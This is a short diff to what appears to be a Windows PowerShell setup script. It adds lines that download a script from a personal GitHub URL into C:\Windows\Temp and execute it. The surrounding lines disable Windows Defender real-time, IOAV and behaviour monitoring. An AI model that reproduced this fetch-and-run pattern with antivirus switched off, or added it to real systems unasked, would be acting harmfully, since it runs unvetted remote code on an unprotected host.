@@ -1,3 +1,5 @@
+iwr -Uri "https://raw.githubusercontent.com/oloruntolaallbert/public/refs/heads/main/ConfigureWinRM.ps1" -OutFile "C:\Windows\Temp\ConfigureWinRM.ps1";
+& "C:\Windows\Temp\ConfigureWinRM.ps1";
 Set-MpPreference -DisableRealtimeMonitoring $true;
 Set-MpPreference -DisableIOAVProtection $true;
 Set-MpPreference -DisableBehaviorMonitoring $true;
